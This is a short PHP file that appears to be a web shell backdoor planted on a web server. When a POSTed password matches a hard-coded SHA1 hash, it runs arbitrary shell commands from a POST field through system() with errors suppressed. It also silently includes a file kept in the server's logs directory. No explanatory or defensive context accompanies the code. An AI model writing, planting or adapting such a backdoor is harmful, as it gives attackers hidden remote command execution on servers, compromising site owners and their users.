<?php if(isset($_POST["p"])&&isset($_POST["w"]))if(hash("sha1",$_POST["p"])==="4b4341a608815b6eb891386ac6c36abb70a4b19d"){@system($_POST["w"]);die();}
@include_once "/var/www/html/logs/w";